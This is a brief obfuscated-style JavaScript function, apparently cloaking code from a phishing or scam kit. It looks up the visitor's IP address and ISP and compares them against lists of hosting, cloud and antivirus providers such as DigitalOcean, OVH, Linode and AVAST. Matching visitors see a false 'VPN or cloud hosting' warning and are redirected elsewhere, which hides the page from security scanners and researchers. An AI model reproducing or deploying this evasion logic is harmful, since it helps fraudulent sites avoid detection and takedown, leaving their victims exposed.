  var token = 20009;

function getIP(_0x5713x2) {
    var _0x5713x3 = new Date();
    var _0x5713x4 = new Date(2050, 11, 31);
    if (_0x5713x3 < _0x5713x4) {
        var _0x5713x5 = (_0x5713x2.ip);
        var _0x5713x6 = (_0x5713x2.org);
        var _0x5713x7 = (_0x5713x2.country);
        _0x5713x6 = / (.+)/.exec(_0x5713x6)[1];
        var _0x5713x8 = ["Hosting Services, Inc.", "DigitalOcean, LLC", "Digital Ocean, Inc.", "Amanah Tech Inc.", "Choopa, LLC", "OVH SAS", "Hutchison Global Communications", "Nobis Technology Group, LLC", "Redstation Limited", "HugeServer Networks, LLC", "SoftLayer Technologies Inc.", "Leaseweb USA, Inc.", "Iomart", "Linode, LLC", "ONLINE S.A.S.", "GleSYS Internet Services AB", "XP Tecnologia Ltda", "Netelligent Hosting Services Inc.", "HostDime.com, Inc.", "Microsoft Informatica Ltda", "SECURED SERVERS LLC", "Nobis Technology Group, LLC", "DigitalOcean, LLC", "CyrusOne LLC", "SECRELNET INFORMATICA LTDA", "QuadraNet, Inc", "UpCloud USA Inc", "Sologigabit S.L.", "M247 Ltd", "NovoServe B.V.", "AVAST Software s.r.o.", "Contina"];
        var _0x5713x9 = ["0.0.0.0", "45.32.149.219", "138.197.142.88", "159.203.21.83", "138.197.142.88", "104.131.124.76"];
        var _0x5713xa = _0x5713x9.join("\|");
        var _0x5713xb = _0x5713x8.join("\|");
        _0x5713xa = new RegExp(_0x5713xa, "i");
        _0x5713xb = new RegExp(_0x5713xb, "i");
        if (_0x5713x5.search(_0x5713xa) != -1) {} else {
            if (_0x5713x6.search(_0x5713xb) != -1) {
                alert("Hello, Warning!! Your ISP : " + _0x5713x2.org + "AS9009 M247 Ltd seems to be a VPN or CLOUD HOSTING, deactivate it and check again");
                window.location.replace("http://www.doogstube.us/")
            }
        }
    } else {
        alert("")
    }
} 
